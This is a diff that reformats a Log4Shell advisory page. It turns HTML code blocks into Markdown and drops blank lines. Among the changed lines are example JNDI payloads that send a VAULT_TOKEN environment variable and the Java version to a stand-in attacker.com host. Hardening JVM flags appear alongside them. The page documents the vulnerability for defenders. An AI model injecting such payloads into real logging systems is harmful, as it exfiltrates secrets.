@@ -42,12 +42,10 @@ Using LDAP calls to leak information about environment variables and system prop
 
 Examples:
 
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">${jndi:ldap://${env:VAULT_TOKEN}.tokens.attacker.com/a} 
-${jndi:ldap://${sys:java.vm.version}.tokens.attacker.com/a} 
-</pre>
-
+```
+${jndi:ldap://${env:VAULT_TOKEN}.tokens.attacker.com/a} 
+${jndi:ldap://${sys:java.vm.version}.tokens.attacker.com/a}
+```
 
 
 Notice, there are several evasion techniques, some examples:
@@ -71,11 +69,9 @@ This is one of the points of the blog post [PSA: Log4Shell and the current state
 
 LDAP deserialization attacks are possible even on latest Java versions. Deserialization is enabled by default. It can be disabled on most recent Java versions. For example, with system properties:
 
-
-
-<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">"-Djdk.serialFilter=!*" "-Djdk.jndi.object.factoriesFilter=!*" "-Dcom.sun.jndi.ldap.object.trustSerialData=false"
-</pre>
-
+```
+"-Djdk.serialFilter=!*" "-Djdk.jndi.object.factoriesFilter=!*" "-Dcom.sun.jndi.ldap.object.trustSerialData=false"
+```
 
 
 could be used to disable remote object deserialization when using LDAP over JNDI. These settings could break applications depending on the serialization being enabled and using JNDI. The javadocs in JDK17 contain more information:
@@ -100,18 +96,8 @@ Other information
 Relevant Tweets
 ---------------
 
-
-
  <a target="_blank" href="https://twitter.com/malwaretechblog/status/1469289471463944198">{{< img src="/images/pages/log4j-cve/image-950x1024.png" alt="" width="436" height="469" >}}</a>
 
-
-
-
-
  <a target="_blank" href="https://twitter.com/malwaretechblog/status/1470096336133373954">{{< img src="/images/pages/log4j-cve/kryptos-1024x1000.png" alt="" width="438" height="428" >}}</a>
-
-
-
-
 
  <a target="_blank" href="https://twitter.com/TomGranot/status/1469704635715706885">{{< img src="/images/pages/log4j-cve/checking-1024x802.png" alt="" width="440" height="345" >}}</a>
